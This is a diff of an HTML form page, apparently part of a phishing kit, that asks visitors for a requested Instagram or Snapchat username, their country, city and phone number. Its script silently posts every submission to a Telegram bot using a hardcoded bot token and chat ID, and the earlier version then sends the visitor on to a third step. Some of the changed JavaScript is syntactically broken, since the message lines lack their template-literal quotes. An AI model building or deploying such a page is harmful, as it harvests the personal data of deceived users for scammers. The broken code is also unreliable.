@@ -13,8 +13,6 @@
       --text-main: #222222;
       --text-muted: #888888;
       --accent-blue: #0070f3;
-      --accent-green: #17a54d;
-      --error-red: #dc2626;
     }
 
     * {
@@ -47,15 +45,11 @@
       padding: 22px 18px 24px;
     }
 
-    .inner-card {
-      padding: 6px 2px 0;
-    }
-
-    h1 {
+    .panel h1 {
       font-size: 22px;
       font-weight: 600;
       text-align: center;
-      margin-bottom: 20px;
+      margin-bottom: 22px;
     }
 
     .form-group {
@@ -82,11 +76,6 @@
         background-color 0.15s ease;
     }
 
-    input::placeholder,
-    select:invalid {
-      color: #c0c4cc;
-    }
-
     input:focus,
     select:focus {
       border-color: var(--accent-blue);
@@ -94,16 +83,16 @@
       background-color: #ffffff;
     }
 
-    .error-text {
+    .error-message {
+      display: none;
       font-size: 11px;
-      color: var(--error-red);
-      margin-top: 3px;
-      display: none; /* يظهر فقط عند وجود حقل فاضي */
+      color: #e11d48; /* أحمر واضح */
+      margin-top: 4px;
     }
 
     .btn-submit {
       width: 100%;
-      margin-top: 8px;
+      margin-top: 10px;
       padding: 11px 0;
       border-radius: 6px;
       border: none;
@@ -116,13 +105,13 @@
         box-shadow 0.15s ease;
     }
 
-    .btn-submit:hover {
-      background: #0060d0;
-    }
-
     .btn-submit:active {
       transform: translateY(1px);
       box-shadow: 0 2px 6px rgba(15, 23, 42, 0.25);
+    }
+
+    .btn-submit:hover {
+      background: #0060d0;
     }
 
     @media (max-width: 400px) {
@@ -135,230 +124,190 @@
 <body>
   <div class="page-wrapper">
     <div class="panel">
-      <div class="inner-card">
-        <h1>More Details</h1>
+      <h1>More Details</h1>
 
-        <form id="step2Form" onsubmit="return false;">
-
-          <!-- اليوزر المطلوب -->
-          <div class="form-group">
-            <label for="wantedUser">Requested username</label>
-            <input
-              id="wantedUser"
-              type="text"
-              required
-            />
+      <form id="detailsForm">
+        <!-- Requested username -->
+        <div class="form-group">
+          <label for="requestedUsername">Requested username</label>
+          <input
+            id="requestedUsername"
+            type="text"
+            autocomplete="off"
+          />
+          <div class="error-message" id="err-requestedUsername">
+            This form is required.
           </div>
+        </div>
 
-          <!-- نوع المنصّة -->
-          <div class="form-group">
-            <label for="platform">Platform (Instagram / Snapchat)</label>
-            <input
-              id="platform"
-              type="text"
-              required
-            />
+        <!-- Platform -->
+        <div class="form-group">
+          <label for="platform">Platform (Instagram / Snapchat)</label>
+          <input
+            id="platform"
+            type="text"
+            autocomplete="off"
+          />
+          <div class="error-message" id="err-platform">
+            This form is required.
           </div>
+        </div>
 
-          <!-- Country -->
-          <div class="form-group">
-            <label for="country">Country</label>
-            <select id="country" required>
-              <option value="">Select country</option>
-              <option value="Afghanistan">Afghanistan</option>
-              <option value="Albania">Albania</option>
-              <option value="Algeria">Algeria</option>
-              <option value="Andorra">Andorra</option>
-              <option value="Angola">Angola</option>
-              <option value="Argentina">Argentina</option>
-              <option value="Armenia">Armenia</option>
-              <option value="Australia">Australia</option>
-              <option value="Austria">Austria</option>
-              <option value="Azerbaijan">Azerbaijan</option>
-              <option value="Bahrain">Bahrain</option>
-              <option value="Bangladesh">Bangladesh</option>
-              <option value="Belarus">Belarus</option>
-              <option value="Belgium">Belgium</option>
-              <option value="Bolivia">Bolivia</option>
-              <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
-              <option value="Brazil">Brazil</option>
-              <option value="Bulgaria">Bulgaria</option>
-              <option value="Cambodia">Cambodia</option>
-              <option value="Cameroon">Cameroon</option>
-              <option value="Canada">Canada</option>
-              <option value="Chile">Chile</option>
-              <option value="China">China</option>
-              <option value="Colombia">Colombia</option>
-              <option value="Costa Rica">Costa Rica</option>
-              <option value="Croatia">Croatia</option>
-              <option value="Cyprus">Cyprus</option>
-              <option value="Czech Republic">Czech Republic</option>
-              <option value="Denmark">Denmark</option>
-              <option value="Dominican Republic">Dominican Republic</option>
-              <option value="Ecuador">Ecuador</option>
-              <option value="Egypt">Egypt</option>
-              <option value="Estonia">Estonia</option>
-              <option value="Finland">Finland</option>
-              <option value="France">France</option>
-              <option value="Georgia">Georgia</option>
-              <option value="Germany">Germany</option>
-              <option value="Greece">Greece</option>
-              <option value="Guatemala">Guatemala</option>
-              <option value="Honduras">Honduras</option>
-              <option value="Hungary">Hungary</option>
-              <option value="Iceland">Iceland</option>
-              <option value="India">India</option>
-              <option value="Indonesia">Indonesia</option>
-              <option value="Iran">Iran</option>
-              <option value="Iraq">Iraq</option>
-              <option value="Ireland">Ireland</option>
-              <option value="Israel">Israel</option>
-              <option value="Italy">Italy</option>
-              <option value="Japan">Japan</option>
-              <option value="Jordan">Jordan</option>
-              <option value="Kazakhstan">Kazakhstan</option>
-              <option value="Kenya">Kenya</option>
-              <option value="Kuwait">Kuwait</option>
-              <option value="Kyrgyzstan">Kyrgyzstan</option>
-              <option value="Latvia">Latvia</option>
-              <option value="Lebanon">Lebanon</option>
-              <option value="Libya">Libya</option>
-              <option value="Lithuania">Lithuania</option>
-              <option value="Luxembourg">Luxembourg</option>
-              <option value="Malaysia">Malaysia</option>
-              <option value="Maldives">Maldives</option>
-              <option value="Malta">Malta</option>
-              <option value="Mexico">Mexico</option>
-              <option value="Moldova">Moldova</option>
-              <option value="Monaco">Monaco</option>
-              <option value="Montenegro">Montenegro</option>
-              <option value="Morocco">Morocco</option>
-              <option value="Nepal">Nepal</option>
-              <option value="Netherlands">Netherlands</option>
-              <option value="New Zealand">New Zealand</option>
-              <option value="Nicaragua">Nicaragua</option>
-              <option value="Nigeria">Nigeria</option>
-              <option value="Norway">Norway</option>
-              <option value="Oman">Oman</option>
-              <option value="Pakistan">Pakistan</option>
-              <option value="Panama">Panama</option>
-              <option value="Paraguay">Paraguay</option>
-              <option value="Peru">Peru</option>
-              <option value="Philippines">Philippines</option>
-              <option value="Poland">Poland</option>
-              <option value="Portugal">Portugal</option>
-              <option value="Qatar">Qatar</option>
-              <option value="Romania">Romania</option>
-              <option value="Russia">Russia</option>
-              <option value="Saudi Arabia">Saudi Arabia</option>
-              <option value="Serbia">Serbia</option>
-              <option value="Singapore">Singapore</option>
-              <option value="Slovakia">Slovakia</option>
-              <option value="Slovenia">Slovenia</option>
-              <option value="South Africa">South Africa</option>
-              <option value="South Korea">South Korea</option>
-              <option value="Spain">Spain</option>
-              <option value="Sri Lanka">Sri Lanka</option>
-              <option value="Sweden">Sweden</option>
-              <option value="Switzerland">Switzerland</option>
-              <option value="Syria">Syria</option>
-              <option value="Taiwan">Taiwan</option>
-              <option value="Tajikistan">Tajikistan</option>
-              <option value="Thailand">Thailand</option>
-              <option value="Tunisia">Tunisia</option>
-              <option value="Turkey">Turkey</option>
-              <option value="Turkmenistan">Turkmenistan</option>
-              <option value="Ukraine">Ukraine</option>
-              <option value="United Arab Emirates">United Arab Emirates</option>
-              <option value="United Kingdom">United Kingdom</option>
-              <option value="United States">United States</option>
-              <option value="Uruguay">Uruguay</option>
-              <option value="Uzbekistan">Uzbekistan</option>
-              <option value="Venezuela">Venezuela</option>
-              <option value="Vietnam">Vietnam</option>
-              <option value="Yemen">Yemen</option>
-            </select>
+        <!-- Country -->
+        <div class="form-group">
+          <label for="country">Country</label>
+          <select id="country">
+            <option value="">Select country</option>
+            <option value="United Arab Emirates">United Arab Emirates</option>
+            <option value="Qatar">Qatar</option>
+            <option value="Saudi Arabia">Saudi Arabia</option>
+            <option value="Kuwait">Kuwait</option>
+            <option value="Bahrain">Bahrain</option>
+            <option value="Oman">Oman</option>
+            <option value="Jordan">Jordan</option>
+            <option value="Turkey">Turkey</option>
+            <!-- الباقي لو حاب تضيفه لاحقاً -->
+          </select>
+          <div class="error-message" id="err-country">
+            This form is required.
           </div>
+        </div>
 
-          <!-- City -->
-          <div class="form-group">
-            <label for="city">City</label>
-            <input
-              id="city"
-              type="text"
-              required
-            />
+        <!-- City -->
+        <div class="form-group">
+          <label for="city">City</label>
+          <input
+            id="city"
+            type="text"
+            autocomplete="off"
+          />
+          <div class="error-message" id="err-city">
+            This form is required.
           </div>
+        </div>
 
-          <!-- Phone (إجباري) -->
-          <div class="form-group">
-            <label for="phone">Phone</label>
-            <input
-              id="phone"
-              type="tel"
-              placeholder="+XXX XXX XXX XXX"
-              required
-            />
-            <div id="formError" class="error-text">This form is required.</div>
+        <!-- Phone -->
+        <div class="form-group">
+          <label for="phone">Phone</label>
+          <input
+            id="phone"
+            type="tel"
+            autocomplete="off"
+            placeholder="+XXX XXX XXX XXX"
+          />
+          <div class="error-message" id="err-phone">
+            This form is required.
           </div>
+        </div>
 
-          <button type="submit" class="btn-submit">Next</button>
-        </form>
-      </div>
+        <button type="submit" class="btn-submit">Next</button>
+      </form>
     </div>
   </div>
 
   <script>
-    const form        = document.getElementById("step2Form");
-    const countryEl   = document.getElementById("country");
-    const errorLabel  = document.getElementById("formError");
+    const form = document.getElementById("detailsForm");
+
+    const requestedUsernameInput = document.getElementById("requestedUsername");
+    const platformInput = document.getElementById("platform");
+    const countrySelect = document.getElementById("country");
+    const cityInput = document.getElementById("city");
+    const phoneInput = document.getElementById("phone");
+
+    const errors = {
+      requestedUsername: document.getElementById("err-requestedUsername"),
+      platform: document.getElementById("err-platform"),
+      country: document.getElementById("err-country"),
+      city: document.getElementById("err-city"),
+      phone: document.getElementById("err-phone"),
+    };
+
+    function showError(fieldKey, show) {
+      errors[fieldKey].style.display = show ? "block" : "none";
+    }
 
     form.addEventListener("submit", function (e) {
       e.preventDefault();
 
-      const wantedUser = document.getElementById("wantedUser").value.trim();
-      const platform   = document.getElementById("platform").value.trim();
-      const country    = countryEl.value;
-      const city       = document.getElementById("city").value.trim();
-      const phone      = document.getElementById("phone").value.trim();
+      const requestedUsername = requestedUsernameInput.value.trim();
+      const platform = platformInput.value.trim();
+      const country = countrySelect.value.trim();
+      const city = cityInput.value.trim();
+      const phone = phoneInput.value.trim();
 
-      // لو فيه أي خانة فاضية بالكامل → طلع رسالة الخطأ بالأحمر
-      if (!wantedUser  !platform  !country  !city  !phone) {
-        errorLabel.style.display = "block";
-        return;
+      let hasError = false;
+
+      if (!requestedUsername) {
+        showError("requestedUsername", true);
+        hasError = true;
       } else {
-        errorLabel.style.display = "none";
+        showError("requestedUsername", false);
       }
 
+      if (!platform) {
+        showError("platform", true);
+        hasError = true;
+      } else {
+        showError("platform", false);
+      }
+
+      if (!country) {
+        showError("country", true);
+        hasError = true;
+      } else {
+        showError("country", false);
+      }
+
+      if (!city) {
+        showError("city", true);
+        hasError = true;
+      } else {
+        showError("city", false);
+      }
+
+      if (!phone) {
+        showError("phone", true);
+        hasError = true;
+      } else {
+        showError("phone", false);
+      }
+
+      // لو في حقل فاضي -> نوقف هنا
+      if (hasError) {
+        return;
+      }
+
+      // ===== إرسال على التليجرام =====
       const message =
-        "🔔 New submission - STEP 2\n" +
-        "-----------------------\n" +
-        "👤 Requested username: " + wantedUser + "\n" +
-        "📱 Platform: " + platform + "\n" +
-        "🌍 Country: " + country + "\n" +
-        "🏙 City: " + city + "\n" +
-        "📞 Phone: " + phone;
+        "🔔 New Step 2 Submission:" +
+        "\n-----------------------" +
+        \n🧾 Requested username: ${requestedUsername} +
+        \n📱 Platform: ${platform} +
+        \n🌍 Country: ${country} +
+        \n🏙 City: ${city} +
+        \n📞 Phone: ${phone};
 
       const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
-      const chatId   = "7811430582";
+      const chatId = "7811430582";
 
-      fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          text: message
+          text: message,
+        }),
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          console.log("Telegram response:", data);
+          // بعد ما ينجح الإرسال تقدر تحوّله لصفحة ثالثة
+          // غيّر اسم الملف اللي بدك تروحه:
+          // window.location.href = "step3.html";
         })
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log("Telegram response:", data);
-        window.location.href = "step3.html";
-      })
-      .catch(error => {
-        console.error("Telegram error:", error);
-        alert("Something went wrong. Try again.");
-      });
+        .catch((error) => {
+          console.error("Telegram error:", error);
+          });
     });
   </script>
 </body>
